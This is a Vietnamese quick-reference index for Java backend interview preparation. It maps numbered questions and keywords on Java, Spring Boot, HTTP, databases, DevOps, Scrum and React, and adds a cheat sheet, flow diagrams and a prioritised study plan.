# 📘 TỔNG HỢP CÂU HỎI PHỎNG VẤN JAVA BACKEND DEVELOPER

> Tài liệu chuẩn bị phỏng vấn toàn diện: Java Core, Spring Boot, J2EE, Git, Architecture & Design Patterns, 



# 📑 PHỤ LỤC — MỤC LỤC TRA CỨU NHANH

> Paste phần này vào cuối file tổng hợp. Click vào số câu hỏi để nhảy đến nội dung (nếu dùng Markdown viewer hỗ trợ anchor).

---

## A. THEO CHỦ ĐỀ

---


### 1. JAVA CORE

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q1 | Bốn tính chất OOP | Encapsulation, Inheritance, Polymorphism, Abstraction |
| Q2 | Abstract Class vs Interface | abstract, interface, default method, Java 8 |
| Q3 | Overloading vs Overriding | compile-time, runtime, polymorphism |
| Q4 | SOLID Principles | SRP, OCP, LSP, ISP, DIP |
| Q5 | Primitive vs Reference types | int, Integer, Stack, Heap |
| Q6 | Stack vs Heap Memory | memory model, StackOverflow, OutOfMemory |
| Q7 | String Pool, String vs StringBuilder vs StringBuffer | immutable, mutable, thread-safe |
| Q8 | == vs equals() vs hashCode() | reference, value, contract |
| Q9 | Immutable class | final, defensive copy, thread-safe |
| Q10 | Collections Framework hierarchy | List, Set, Queue, Map |
| Q11 | ArrayList vs LinkedList | array, linked list, O(1), O(n) |
| Q12 | HashMap hoạt động nội bộ | bucket, hashCode, treeify, resize |
| Q13 | HashMap vs Hashtable vs ConcurrentHashMap | thread-safe, segment locking |
| Q14 | Fail-fast vs Fail-safe Iterator | ConcurrentModificationException |
| Q15 | Exception hierarchy | Checked, Unchecked, Error |
| Q16 | throw vs throws, final vs finally vs finalize | exception keywords |
| Q17 | Try-with-resources | AutoCloseable, Java 7 |
| Q18 | Functional Interface, Lambda, Method Reference | @FunctionalInterface, Predicate, Function |
| Q19 | Stream API | filter, map, collect, parallel |
| Q20 | Optional | NullPointerException, orElse, map |
| Q21 | Tạo Thread | Thread, Runnable, Callable, ExecutorService |
| Q22 | synchronized, Deadlock | lock, mutual exclusion |
| Q23 | volatile, Atomic classes | visibility, CAS, AtomicInteger |
| Q24 | Thread Pool, ExecutorService | FixedThreadPool, CachedThreadPool |
| Q25 | Generics, Wildcards | `<T>`, `? extends`, `? super`, PECS |
| Q26 | Type Erasure | compile-time, runtime, generic info |
| Q26.1 | Annotation trong Java là gì? | metadata, reflection, custom annotation |
| Q26.2 | @Retention và @Target | SOURCE, CLASS, RUNTIME, TYPE, METHOD |
| Q26.3 | Bảng annotation Spring Boot theo nhóm | stereotype, DI, web, JPA, testing |
| Q26.4 | @SpringBootApplication gồm gì? | @SpringBootConfiguration, @EnableAutoConfiguration, @ComponentScan |
| Q26.5 | @Configuration vs @Component vs @Bean | CGLIB proxy, bean factory method |
| Q26.6 | @Value vs @ConfigurationProperties | type-safe config, validation, relaxed binding |

### JAVA CORE BỔ SUNG (FUNDAMENTALS & ADVANCED)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q162 | JDK vs JRE vs JVM | bytecode, runtime, dev kit |
| Q163 | Các loại biến trong Java | local, instance, static, constant |
| Q164 | Constructor vs Method | init, return type, this() |
| Q165 | static keyword, static block vs method | class-level, init |
| Q166 | this vs super | reference, parent class |
| Q167 | final keyword | variable, method, class |
| Q168 | Anonymous class | inline class, callback |
| Q169 | Array vs ArrayList | fixed size, dynamic |
| Q170 | Comparator vs Comparable | sort, natural order |
| Q171 | Encapsulation, private | data hiding, getter/setter |
| Q172 | Tính năng Java | WORA, GC, OOP |
| Q173 | Custom Exception | business error |
| Q174 | finally + return | override return, anti-pattern |
| Q175 | NullPointerException phòng tránh | Optional, null check |
| Q176 | wait() vs sleep() | lock, Object, Thread |
| Q177 | map vs flatMap | 1-to-1, 1-to-many, flatten |
| Q178 | Lazy evaluation | intermediate, terminal op |
| Q179 | parallelStream | ForkJoinPool, song song |
| Q180 | findAny vs findFirst | encounter order, Optional |
| Q181 | Default & Static method trong Interface | Java 8, diamond |

### JAVA STRUCTURES & GENERICS (BỔ SUNG)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q182 | Stack trong Java là gì? | LIFO, push, pop, peek |
| Q183 | Queue trong Java là gì? | FIFO, offer, poll, peek |
| Q184 | LinkedList hoạt động như thế nào? | doubly linked list, node |
| Q185 | Array trong Java — đặc điểm và lưu ý | fixed-size, index, memory |
| Q186 | Generic Class là gì? | type-safe, `<T>`, reusable |
| Q187 | Generic Method và bounded type (`extends`/`super`) | PECS, wildcard, API design |

### 2. SPRING FRAMEWORK & SPRING BOOT

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q27 | IoC và Dependency Injection | Constructor, Setter, Field injection |
| Q28 | Bean Scopes | singleton, prototype, request, session |
| Q29 | Bean Lifecycle | @PostConstruct, @PreDestroy |
| Q30 | @Component vs @Service vs @Repository vs @Controller | stereotype annotations |
| Q31 | @Autowired, giải quyết nhiều bean cùng type | @Primary, @Qualifier |
| Q32 | Spring Boot vs Spring Framework | auto-config, starter, embedded server |
| Q33 | Auto-Configuration hoạt động thế nào | @Conditional, classpath scanning |
| Q34 | application.properties/yml, Profiles | dev, prod, @Profile |
| Q35 | Spring Boot Actuator | health, metrics, monitoring |
| Q36 | Request lifecycle Spring MVC | DispatcherServlet, HandlerMapping |
| Q37 | REST Controller annotations | @GetMapping, @PathVariable, @RequestBody |
| Q38 | Exception Handling | @ControllerAdvice, @ExceptionHandler |
| Q39 | Validation | @Valid, @NotBlank, custom validator |
| Q40 | JPA vs Hibernate vs Spring Data JPA | ORM, specification, implementation |
| Q41 | Entity mapping & relationships | @OneToMany, @ManyToOne, @JoinColumn |
| Q42 | LAZY vs EAGER, N+1 Problem | FetchType, JOIN FETCH, @EntityGraph |
| Q43 | Repository methods | Derived query, @Query, Pageable |
| Q44 | @Transactional | propagation, isolation, rollback, proxy |
| Q45 | Spring Security cơ bản | SecurityFilterChain, RBAC |
| Q46 | JWT Authentication flow | token, Bearer, JwtUtil |

### 3. J2EE (Jakarta EE)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q47 | Servlet là gì, Lifecycle | init, service, destroy |
| Q48 | Servlet Filter vs Spring Interceptor | doFilter, preHandle |
| Q49 | JSP, JSTL, EL | Expression Language, tag library |
| Q50 | Session & Cookie | HttpSession, Set-Cookie, HttpOnly |
| Q51 | JDBC, Connection Pooling | PreparedStatement, HikariCP |
| Q52 | JMS (Java Message Service) | Queue, Topic, @JmsListener |
| Q188 | WAR vs JAR | WEB-INF, lib, classes, packaging |
| Q189 | Servlet Container (Tomcat/Jetty/Undertow) | embedded server, throughput |
| Q190 | EJB types | Stateless, Stateful, Singleton, MDB |
| Q191 | ServletContext vs ServletConfig vs HttpSession | scope, lifecycle |
| Q192 | @WebServlet/@WebFilter/@WebListener vs web.xml | annotation config |
| Q193 | Embedded server vs WAR deploy | DevOps, portability |
| Q194 | CDI vs Spring DI | @Inject, @Named, IoC container |
| Q195 | JTA vs Spring @Transactional | distributed transaction, XA |
| Q196 | Bean Validation sâu | @NotNull/@NotBlank/@NotEmpty, @Valid/@Validated |

### 4. GIT

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q53 | Các lệnh Git cơ bản | add, commit, push, pull, branch |
| Q54 | Merge vs Rebase | merge commit, linear history |
| Q55 | Git Flow | main, develop, feature, release, hotfix |
| Q56 | Giải quyết Merge Conflict | conflict markers, abort |
| Q57 | Cherry-pick, Squash, Reset | interactive rebase, soft/hard reset |

### 5. ARCHITECTURE

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q58 | Monolith vs Microservices | deploy, scale, team |
| Q59 | Microservices components | Gateway, Discovery, Config, Circuit Breaker |
| Q60 | Communication giữa Microservices | REST, gRPC, Kafka, RabbitMQ |
| Q61 | Circuit Breaker Pattern | CLOSED, OPEN, HALF_OPEN, Resilience4j |
| Q62 | Layered Architecture | Controller → Service → Repository |
| Q63 | DTO Pattern | Data Transfer Object, MapStruct |
| Q64 | REST principles & best practices | URI design, HTTP status codes |
| Q65 | Pagination, Sorting, Filtering | Pageable, PageRequest, Sort |

### 6. DESIGN PATTERNS

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q66 | Singleton | eager, lazy, double-checked locking, enum |
| Q67 | Factory | Simple Factory, Abstract Factory |
| Q68 | Builder | fluent API, Lombok @Builder |
| Q69 | Adapter | interface compatibility, wrapper |
| Q70 | Proxy | caching proxy, AOP proxy, @Transactional |
| Q71 | Decorator | wrapping, chaining behaviors |
| Q72 | Strategy | runtime algorithm swap, pricing |
| Q73 | Observer | event listener, publish/subscribe |
| Q74 | Template Method | skeleton algorithm, hooks |
| Q75 | Repository | data access abstraction, Criteria |
| Q76 | MVC | Model-View-Controller |

### 7. NÂNG CAO & TỔNG HỢP

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q77 | CAP Theorem | Consistency, Availability, Partition |
| Q78 | ACID vs BASE | transaction, eventual consistency |
| Q79 | Caching strategies | Cache-Aside, Write-Through, @Cacheable |
| Q80 | Database Indexing | B-Tree, composite index, cardinality |
| Q81 | SQL vs NoSQL | relational, document, key-value, graph |
| Q82 | Connection Pool, HikariCP | pool size, timeout, leak detection |
| Q83 | PUT vs PATCH vs POST | idempotent, partial update |
| Q84 | API Versioning | URI, header, parameter, media type |
| Q85 | Logging best practices | SLF4J, Logback, log levels |
| Q86 | Docker basics | Dockerfile, multi-stage, docker-compose |
| Q87 | Testing | JUnit, Mockito, MockMvc, @DataJpaTest |
| Q88 | AOP | @Aspect, @Around, pointcut, cross-cutting |
| Q89 | Scheduler | @Scheduled, cron, fixedRate |
| Q90 | WebSocket vs REST | full-duplex, persistent, STOMP |
| Q197 | JUnit 5 annotations chi tiết | @Test, @ParameterizedTest, @MethodSource |
| Q198 | AAA pattern | Arrange, Act, Assert |
| Q199 | Mockito nâng cao | @Mock, @Spy, verify, captor |
| Q200 | Spring test slices | @SpringBootTest, @WebMvcTest, @DataJpaTest |
| Q201 | MockMvc test REST | perform, andExpect, jsonPath |
| Q202 | Code coverage & JaCoCo | line, branch, threshold |
| Q203 | Test Pyramid | unit, integration, e2e ratio |
| Q204 | Testcontainers | real DB in test, Docker |
| Q205 | Test @Transactional/@Async/@Scheduled | rollback, async wait, scheduler |

### 8. BEHAVIORAL & SCENARIO

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q91 | Bug trên production | hotfix, post-mortem |
| Q92 | Tối ưu API chậm | profiling, index, cache, async |
| Q93 | 12-Factor App | SaaS, config, stateless, disposability |
| Q94 | Event-Driven Architecture | event sourcing, CQRS |
| Q95 | Database Migration | Flyway, Liquibase, versioned SQL |
| Q96 | Saga Pattern | choreography, orchestration, compensation |
| Q97 | Rate Limiting | Token Bucket, 429 Too Many Requests |
| Q98 | Health Check & Graceful Shutdown | Actuator, custom indicator |
| Q99 | OpenAPI/Swagger | @Operation, @ApiResponse, swagger-ui |
| Q100 | Scenario questions | URL shortener, e-commerce, pagination |

### 9. HTTP & WEB FUNDAMENTALS (BỔ SUNG)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q101 | HTTP là gì, đặc điểm | stateless, request-response |
| Q102 | Cấu trúc HTTP Request/Response | request line, headers, body |
| Q103 | HTTP Methods chi tiết | GET, POST, PUT, PATCH, DELETE, idempotent, safe |
| Q104 | HTTP Status Codes chi tiết | 1xx–5xx, 401 vs 403, 301 vs 302 vs 307 |
| Q105 | HTTP Headers quan trọng | Content-Type, Authorization, Cache-Control, ETag |
| Q106 | HTTP/1.0 vs 1.1 vs 2 vs 3 | keep-alive, multiplexing, QUIC |
| Q107 | HTTPS và SSL/TLS | TLS handshake, certificate, symmetric vs asymmetric |
| Q108 | Cookie hoạt động chi tiết | Set-Cookie, HttpOnly, Secure, SameSite |
| Q109 | Session-based vs Token-based Auth | JSESSIONID, JWT, stateless |
| Q110 | OAuth 2.0 | Authorization Code, PKCE, access/refresh token |
| Q111 | CORS | Same-Origin Policy, preflight, Access-Control headers |
| Q112 | CSRF | cross-site forgery, CSRF token, SameSite |
| Q113 | XSS | Stored, Reflected, DOM-based, CSP, HttpOnly |
| Q114 | SQL Injection | parameterized query, PreparedStatement |
| Q115 | Security Headers | CSP, HSTS, X-Frame-Options |
| Q116 | Polling vs Long Polling vs SSE vs WebSocket | real-time, full-duplex, event-stream |
| Q117 | REST vs GraphQL vs gRPC | over-fetching, Protobuf, schema |
| Q118 | Message Queue vs Event Streaming | RabbitMQ, Kafka, replay |
| Q119 | DNS hoạt động thế nào | A record, CNAME, TLD, resolution |
| Q120 | TCP vs UDP | 3-way handshake, reliable, connectionless |
| Q121 | Mô hình OSI 7 tầng | Application → Physical |
| Q122 | Gõ URL → hiển thị trang | DNS → TCP → TLS → HTTP → Render |
| Q123 | HATEOAS | Richardson Maturity, hypermedia links |
| Q124 | Idempotency | Idempotency-Key, safe retry |
| Q125 | Content Negotiation | Accept header, produces |
| Q126 | ETag và Conditional Requests | If-None-Match, 304 Not Modified |
| Q127 | Multipart Upload / File handling | MultipartFile, download |
| Q128 | Forward Proxy vs Reverse Proxy | Nginx, HAProxy, SSL termination |
| Q129 | Load Balancing Algorithms | Round Robin, Least Connections, IP Hash |
| Q130 | CDN | edge server, cache static, Cloudflare |
| Q131 | Encoding vs Encryption vs Hashing | Base64, AES, RSA, bcrypt, SHA |
| Q132 | JSON vs XML, Serialization | Jackson, @JsonProperty, @JsonIgnore |
| Q133 | URL Encoding | %20, URLEncoder, special characters |
| Q134 | Stateless vs Stateful | scale, session, JWT |
| Q135 | Synchronous vs Asynchronous | blocking, callback, CompletableFuture |
| Q136 | Blocking vs Non-Blocking I/O | thread-per-request, event loop, WebFlux |
| Q137 | Redirect vs Forward | 302, server-side, PRG pattern |
| Q138 | Webhook | reverse API, callback URL, signature |
| Q139 | API Gateway | routing, rate limit, Spring Cloud Gateway |

### 10. DATABASE (BỔ SUNG)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q140 | Chuẩn hóa dữ liệu (1NF, 2NF, 3NF, BCNF) | normalization, redundancy, anomaly |
| Q141 | Isolation levels và hiện tượng dirty/non-repeatable/phantom read | transaction, read committed, serializable |
| Q142 | Optimistic Locking vs Pessimistic Locking | @Version, SELECT FOR UPDATE, deadlock |
| Q143 | Đọc và phân tích EXPLAIN execution plan | index scan, full table scan, cost |
| Q144 | Offset pagination vs Cursor pagination | offset, keyset, large dataset |
| Q145 | Partitioning và Sharding khác nhau thế nào | range/hash/list partition, horizontal scale |
| Q146 | Replication Primary-Replica và failover | read replica, replication lag, HA |
| Q147 | Soft Delete, Hard Delete và Audit Trail | deleted_at, compliance, restore |
| Q148 | Thiết kế constraints: PK, FK, UNIQUE, CHECK | data integrity, referential integrity |
| Q149 | Mô hình dữ liệu cho time-series và event log | append-only, retention, rollup |
| Q150 | Denormalization và Materialized View | read optimization, precompute, refresh |
| Q151 | Backup/Restore và Point-in-Time Recovery (PITR) | snapshot, binlog/WAL, disaster recovery |
| Q152 | Multi-tenant database patterns | shared schema, separate schema, separate DB |
| Q153 | Outbox Pattern và CDC trong microservices | exactly-once, eventual consistency, Debezium |
| Q154 | Chiến lược sinh ID: AUTO_INCREMENT, UUID, Snowflake | hotspot, ordering, distributed id |

### 11. CI/CD & CLOUD (BỔ SUNG)

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q155 | CI vs CD khác nhau thế nào? | continuous integration, continuous delivery, deployment |
| Q156 | Pipeline CI/CD mẫu cho backend app? | build, test, docker build, deploy |
| Q157 | Deployment strategies: Rolling, Blue-Green, Canary | release strategy, rollback, traffic split |
| Q158 | Infrastructure as Code (IaC) với Terraform là gì? | terraform, state, plan, apply |
| Q159 | Docker và Kubernetes vai trò khác nhau thế nào? | container, orchestration, self-healing |
| Q160 | IaaS, PaaS, SaaS khác nhau ra sao? | cloud service model |
| Q161 | Auto Scaling và Load Balancing trên cloud hoạt động thế nào? | horizontal scaling, health check, lb |

### 12. SCRUM & AGILE

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q206 | Agile là gì? | Agile Manifesto, values, principles |
| Q207 | Scrum vs Kanban | sprint, WIP limit, continuous flow |
| Q208 | Vai trò Scrum | Product Owner, Scrum Master, Developers |
| Q209 | 5 sự kiện Scrum | planning, daily, review, retrospective |
| Q210 | 3 artifacts Scrum | product backlog, sprint backlog, increment |
| Q211 | DoD vs Acceptance Criteria | quality gate, story completion |
| Q212 | User Story + INVEST | As a/I want/so that, testable |
| Q213 | Story Point/Velocity/Burndown | estimation, forecast, progress |
| Q214 | Epic vs Feature vs Story vs Task | backlog hierarchy |

### 13. REACT BASICS

| # | Câu hỏi | Keyword |
|---|---------|---------|
| Q215 | React và Virtual DOM | reconciliation, diffing |
| Q216 | JSX là gì | transpile, React.createElement |
| Q217 | Function vs Class Component | hooks, lifecycle |
| Q218 | useState | batching, functional update |
| Q219 | useEffect | dependency array, cleanup |
| Q220 | Props vs State | one-way data flow, immutable props |
| Q221 | Lifecycle với hooks | mount/update/unmount |
| Q222 | Conditional/List rendering | key, render branch |
| Q223 | Gọi REST API trong React | fetch/axios, CORS |

---

## B. TRA CỨU THEO KEYWORD

> Khi quên câu nào, tìm keyword ở đây rồi nhảy đến số câu hỏi tương ứng.

| Keyword | Câu hỏi liên quan |
|---------|-------------------|
| Abstract class | Q2, Q4 |
| ACID / BASE | Q44, Q78 |
| AOP | Q70, Q88 |
| API Gateway | Q59, Q139 |
| ArrayList / LinkedList | Q11 |
| Authentication / Authorization | Q45, Q46, Q109, Q110 |
| Auto-configuration | Q32, Q33 |
| Bean | Q27, Q28, Q29, Q30, Q31 |
| Builder | Q68 |
| Cache | Q79, Q126 |
| CAP Theorem | Q77 |
| CDN | Q130 |
| CI/CD | Q155, Q156, Q157 |
| Circuit Breaker | Q61 |
| Cloud (IaaS/PaaS/SaaS) | Q160 |
| Collections | Q10, Q11, Q12, Q13, Q14 |
| Connection Pool | Q51, Q82 |
| Cookie | Q50, Q108 |
| CORS | Q111 |
| Constraints (PK/FK/UNIQUE/CHECK) | Q148 |
| CQRS | Q94 |
| CSRF | Q112 |
| Cursor Pagination | Q65, Q144 |
| Database Normalization | Q140 |
| Deadlock | Q22, Q142 |
| Decorator | Q71 |
| Dependency Injection | Q27 |
| Design Patterns | Q66–Q76 |
| Docker | Q86 |
| DNS | Q119 |
| DTO | Q63 |
| Encoding / Encryption / Hashing | Q131 |
| ETag | Q105, Q126 |
| Event-Driven | Q73, Q94, Q118 |
| Execution Plan / EXPLAIN | Q143 |
| Exception | Q15, Q16, Q17, Q38 |
| ExecutorService / Thread Pool | Q21, Q24 |
| Factory | Q67 |
| Fail-fast / Fail-safe | Q14 |
| Filter / Interceptor | Q48 |
| Flyway / Liquibase | Q95 |
| Generics | Q25, Q26 |
| Git | Q53–Q57 |
| Git Flow | Q55 |
| GraphQL | Q117 |
| gRPC | Q60, Q117 |
| GitHub Actions | Q156 |
| HashMap | Q12, Q13 |
| HATEOAS | Q123 |
| HTTP Methods | Q83, Q103 |
| HTTP Status Codes | Q64, Q104 |
| HTTP versions | Q106 |
| HTTPS / TLS | Q107 |
| Idempotent | Q83, Q103, Q124 |
| Isolation Level | Q44, Q141 |
| Immutable | Q7, Q9 |
| Index (Database) | Q80 |
| Interface | Q2 |
| JDBC | Q51 |
| JMS | Q52 |
| JPA / Hibernate | Q40, Q41, Q42, Q43 |
| JSON / XML | Q132 |
| JSP | Q49 |
| JWT | Q46, Q109 |
| Kafka | Q60, Q118 |
| Kubernetes | Q159 |
| Lambda | Q18 |
| Layered Architecture | Q62 |
| Load Balancing | Q128, Q129 |
| Logging | Q85 |
| Long Polling / SSE / WebSocket | Q90, Q116 |
| Memory (Stack/Heap) | Q5, Q6 |
| Merge vs Rebase | Q54 |
| Microservices | Q58, Q59, Q60, Q61 |
| Monolith | Q58 |
| MVC | Q36, Q76 |
| N+1 Problem | Q42 |
| NoSQL | Q81 |
| Outbox / CDC | Q153 |
| OAuth 2.0 | Q110 |
| Observer | Q73 |
| OOP | Q1, Q2, Q3 |
| Optional | Q20 |
| OSI Model | Q121 |
| Overloading / Overriding | Q3 |
| Pagination | Q43, Q65 |
| Partitioning / Sharding | Q145 |
| Polymorphism | Q1, Q3 |
| Profiles | Q34 |
| Proxy (pattern) | Q70 |
| Proxy (network) | Q128 |
| Replication (Primary-Replica) | Q146 |
| Rate Limiting | Q97 |
| Redirect / Forward | Q137 |
| REST | Q36, Q37, Q64, Q65, Q117, Q123 |
| Saga | Q96 |
| Scheduler | Q89 |
| Security Headers | Q115 |
| Serialization | Q132 |
| Servlet | Q47, Q48 |
| Session | Q50, Q109 |
| Singleton | Q66 |
| SOLID | Q4 |
| Spring Boot | Q32, Q33, Q34, Q35 |
| Spring Data JPA | Q40–Q43 |
| Spring Security | Q45, Q46 |
| SQL Injection | Q114 |
| SQL vs NoSQL | Q81 |
| Soft Delete / Audit Trail | Q147 |
| SSE | Q116 |
| Stateless / Stateful | Q134 |
| Strategy | Q72 |
| Stream API | Q19 |
| String | Q7, Q8 |
| Swagger / OpenAPI | Q99 |
| Sync / Async | Q135 |
| synchronized / volatile | Q22, Q23 |
| TCP / UDP | Q120 |
| Template Method | Q74 |
| Testing | Q87 |
| Terraform / IaC | Q158 |
| Thread | Q21, Q22, Q23, Q24 |
| @Transactional | Q44 |
| 12-Factor | Q93 |
| Type Erasure | Q26 |
| URL Encoding | Q133 |
| UUID / Snowflake ID | Q154 |
| Validation | Q39 |
| Webhook | Q138 |
| WebSocket | Q90, Q116 |
| XSS | Q113 |
| JDK / JRE / JVM | Q162 |
| Java Variables (local/instance/static/final) | Q163 |
| Constructor | Q164 |
| static keyword | Q165 |
| this / super | Q166 |
| final keyword | Q167 |
| Anonymous class | Q168 |
| Array vs ArrayList | Q11, Q169 |
| Comparable / Comparator | Q170 |
| Encapsulation / private | Q1, Q171 |
| Java features (WORA, GC) | Q172 |
| Custom Exception | Q173 |
| finally return anti-pattern | Q174 |
| NullPointerException (NPE) | Q20, Q175 |
| wait / sleep | Q176 |
| map / flatMap | Q177 |
| Lazy evaluation (Stream) | Q178 |
| parallelStream | Q179 |
| findAny / findFirst | Q180 |
| Interface default/static methods | Q2, Q181 |
| Stack (Java) | Q182 |
| Queue (Java) | Q183 |
| LinkedList (Java) | Q11, Q184 |
| Array (Java) | Q169, Q185 |
| Generic class | Q25, Q186 |
| Generic method / PECS | Q25, Q187 |
| WAR / JAR | Q188 |
| Servlet Container | Q47, Q189 |
| EJB | Q190 |
| ServletContext / ServletConfig / HttpSession | Q191 |
| @WebServlet / @WebFilter / @WebListener | Q192 |
| Embedded Tomcat | Q193 |
| CDI | Q194 |
| JTA | Q195 |
| Bean Validation | Q39, Q196 |
| JUnit 5 | Q87, Q197 |
| AAA Pattern | Q198 |
| Mockito | Q87, Q199 |
| MockMvc | Q87, Q201 |
| Code Coverage / JaCoCo | Q202 |
| Test Pyramid | Q203 |
| Testcontainers | Q204 |
| @Async / @Scheduled testing | Q205 |
| Agile / Scrum | Q206–Q214 |
| Definition of Done | Q211 |
| INVEST | Q212 |
| Story Point / Velocity | Q213 |
| React | Q215–Q223 |
| Virtual DOM | Q215 |
| JSX | Q216 |
| useState | Q218 |
| useEffect | Q219 |
| Props vs State | Q220 |
| List key (React) | Q222 |
| CORS (React + Spring) | Q111, Q223 |

---

## C. CHEAT SHEET — CÁC CON SỐ QUAN TRỌNG

```
HTTP Status:
  200 OK · 201 Created · 204 No Content
  301 Permanent · 302 Found · 304 Not Modified · 307 Temp Redirect
  400 Bad Request · 401 Unauthorized · 403 Forbidden · 404 Not Found
  409 Conflict · 422 Unprocessable · 429 Too Many Requests
  500 Internal · 502 Bad Gateway · 503 Unavailable · 504 Timeout

Java Primitive Sizes:
  byte=1 · short=2 · int=4 · long=8 · float=4 · double=8 · char=2 · boolean=~1

HashMap Defaults:
  Initial capacity = 16 · Load factor = 0.75 · Treeify threshold = 8

HikariCP Recommended:
  max-pool-size = 10 · min-idle = 5 · connection-timeout = 30s

Spring Bean Scopes:
  singleton (default) · prototype · request · session · application

@Transactional Defaults:
  propagation = REQUIRED · isolation = DEFAULT · rollbackFor = unchecked only

JWT Structure:
  Header.Payload.Signature (Base64URL encoded)

TCP Handshake:
  SYN → SYN-ACK → ACK (3-way)

TLS Handshake:
  ClientHello → ServerHello+Cert → KeyExchange → Encrypted

OSI Layers:
  7-Application · 6-Presentation · 5-Session · 4-Transport
  3-Network · 2-Data Link · 1-Physical

Collection Thread Safety:
  ArrayList ✗ · Vector ✓ · HashMap ✗ · Hashtable ✓
  ConcurrentHashMap ✓ · CopyOnWriteArrayList ✓

Big-O Common:
  ArrayList get=O(1) · add=O(1)* · remove=O(n)
  LinkedList get=O(n) · addFirst=O(1) · remove=O(1)
  HashMap get/put=O(1) avg · O(n) worst → O(log n) with treeify
  TreeMap get/put=O(log n)
```

---

## D. FLOW DIAGRAMS TÓM TẮT

### Spring Request Flow:
```
Client → Filter → DispatcherServlet → HandlerMapping → Interceptor
→ Controller → Service → Repository → DB
→ Response → Interceptor → Filter → Client
```

### JWT Auth Flow:
```
Login: Client → POST /login → Server validate → JWT token → Client stores
Request: Client → Header: Bearer JWT → Filter validate → SecurityContext → Controller
```

### OAuth 2.0 Authorization Code:
```
Client → Auth Server (login+consent) → redirect with code
→ Client backend + code + secret → Auth Server → access_token
→ Client + access_token → Resource Server → protected data
```

### Microservice Communication:
```
Sync:  Service A → REST/gRPC → Service B → response
Async: Service A → Kafka/RabbitMQ → Service B (eventually)
```

### Git Flow:
```
feature/* → develop → release/* → main
                                    ↑
                              hotfix/*
```

### Database Query Optimization Checklist:
```
1. EXPLAIN ANALYZE query
2. Add index on WHERE/JOIN/ORDER BY columns
3. Fix N+1 (JOIN FETCH / @EntityGraph / @BatchSize)
4. Pagination (LIMIT/OFFSET or cursor-based)
5. Select only needed columns (projection)
6. Cache frequently accessed data
7. Connection pooling (HikariCP)
```

---
## E. LỘ TRÌNH ÔN TẬP ƯU TIÊN

| Mức ưu tiên | Mô tả | Số câu đề xuất |
|---|---|---|
| MUST-KNOW | Fresher Java Backend gần như chắc chắn bị hỏi (xác suất cao) | 61 |
| SHOULD-KNOW | Nên nắm để trả lời chắc tay, mở rộng tốt | 95 |
| NICE-TO-HAVE | Bonus, giúp nổi bật khi phỏng vấn | 69 |

> Ghi chú: cột **Số câu đề xuất** là số lượng thống kê, không phải link. Dùng các link `Q...` bên dưới để nhảy nhanh.

### Danh sách ôn theo mức ưu tiên

| Mức | Nên ôn trước |
|---|---|
| MUST-KNOW | [Q1](#q1)–[Q46](#q46), [Q64](#q64), [Q80](#q80), [Q83](#q83), [Q87](#q87), [Q188](#q188), [Q191](#q191), [Q193](#q193), [Q196](#q196), [Q197](#q197), [Q199](#q199), [Q200](#q200), [Q201](#q201), [Q215](#q215), [Q219](#q219), [Q223](#q223) |
| SHOULD-KNOW | [Q47](#q47)–[Q63](#q63), [Q65](#q65)–[Q79](#q79), [Q81](#q81)–[Q90](#q90), [Q140](#q140)–[Q161](#q161), [Q182](#q182)–[Q187](#q187), [Q189](#q189), [Q190](#q190), [Q192](#q192), [Q194](#q194), [Q195](#q195), [Q202](#q202)–[Q205](#q205), [Q206](#q206)–[Q214](#q214), [Q216](#q216)–[Q222](#q222) |
| NICE-TO-HAVE | [Q91](#q91)–[Q100](#q100), [Q101](#q101)–[Q139](#q139), [Q162](#q162)–[Q181](#q181) |

### Top 25 câu hỏi xác suất cao (Fresher Java Spring Boot)

1. [Q1](#q1) — 4 tính chất OOP là nền tảng cho mọi câu Java.
2. [Q2](#q2) — Abstract class vs Interface là câu mở đầu rất hay gặp.
3. [Q3](#q3) — Overloading vs Overriding để kiểm tra hiểu đa hình.
4. [Q7](#q7) — String Pool, StringBuilder/StringBuffer hỏi rất thường xuyên.
5. [Q8](#q8) — `==` vs `equals` vs `hashCode` là câu bẫy kinh điển.
6. [Q11](#q11) — ArrayList vs LinkedList kiểm tra tư duy cấu trúc dữ liệu.
7. [Q12](#q12) — HashMap internals là câu phân loại ứng viên.
8. [Q15](#q15) — Exception hierarchy (checked/unchecked) cực phổ biến.
9. [Q17](#q17) — Try-with-resources thể hiện coding best practice.
10. [Q19](#q19) — Stream API xuất hiện dày trong code thực tế.
11. [Q20](#q20) — Optional để tránh NPE trong service layer.
12. [Q22](#q22) — `synchronized` và deadlock là nền tảng concurrency.
13. [Q25](#q25) — Generics + wildcard (`extends/super`) hay bị hỏi sâu.
14. [Q27](#q27) — IoC/DI là trục chính của Spring.
15. [Q31](#q31) — `@Autowired` conflict (`@Primary`, `@Qualifier`) hỏi thực chiến.
16. [Q38](#q38) — Global exception handling (`@ControllerAdvice`) rất thực tế.
17. [Q42](#q42) — LAZY/EAGER + N+1 là vấn đề production điển hình.
18. [Q44](#q44) — `@Transactional` và cơ chế proxy là câu then chốt.
19. [Q45](#q45) — Authentication vs Authorization trong Spring Security.
20. [Q46](#q46) — JWT flow là câu gần như bắt buộc với fresher backend.
21. [Q64](#q64) — REST principles + status code là phần API design cơ bản.
22. [Q80](#q80) — Database Indexing để đánh giá tư duy performance.
23. [Q83](#q83) — PUT/PATCH/POST và idempotency rất hay bị hỏi bẫy.
24. [Q87](#q87) — Testing trong Spring Boot (unit/integration).
25. [Q199](#q199) — Mockito (`@Mock`, `verify`, captor) để chứng minh khả năng test.

### Câu hỏi bẫy thường gặp (Fresher hay sai)

| Câu bẫy | Trả lời sai phổ biến | Trả lời đúng ngắn gọn |
|---|---|---|
| HashMap có thread-safe không? ([Q13](#q13)) | “Có, vì Java tự xử lý” | **Không**; dùng ConcurrentHashMap/synchronization khi đa luồng |
| String immutable nghĩa là gì? ([Q7](#q7), [Q9](#q9)) | “Không đổi vì `final`” | Object String không đổi state; phép nối tạo object mới |
